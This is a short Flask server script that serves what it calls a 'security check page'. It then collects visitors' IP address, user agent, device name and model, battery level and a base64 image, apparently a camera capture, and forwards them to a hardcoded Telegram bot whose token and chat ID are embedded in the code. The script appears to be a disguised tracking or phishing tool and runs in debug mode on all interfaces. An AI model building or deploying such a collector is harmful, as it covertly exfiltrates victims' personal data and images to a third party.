from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

# Telegram Bot Setup
TELEGRAM_BOT_API = 'https://api.telegram.org/bot7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78/sendMessage'
CHAT_ID = '912211827'

def send_to_telegram(message):
    data = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.post(TELEGRAM_BOT_API, data=data)
    return response

# Route to render the security check page
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/sendData', methods=['POST'])
def collect_data():
    # Receive data from the frontend
    data = request.get_json()
    
    # Extract the relevant information from the data
    ip = data['ip']
    userAgent = data['userAgent']
    deviceName = data['deviceName']
    deviceModel = data['deviceModel']
    batteryLevel = data['batteryLevel']
    image = data['image']

    # Create a formatted message
    message = f"""
    IP Address: {ip}
    User Agent: {userAgent}
    Device Name: {deviceName}
    Device Model: {deviceModel}
    Battery Level: {batteryLevel}
    Image: {image}  # This is the base64 encoded image
    """

    # Send the message to Telegram bot
    response = send_to_telegram(message)

    # Return a response indicating success
    if response.status_code == 200:
        return jsonify({'status': 'Data sent successfully!'})
    else:
        return jsonify({'status': 'Failed to send data to Telegram.'}), 500

if __name__ == '__main__':
    # Run the Flask app on all network interfaces and accessible on all IPs
    app.run(debug=True, host='0.0.0.0', port=5000)
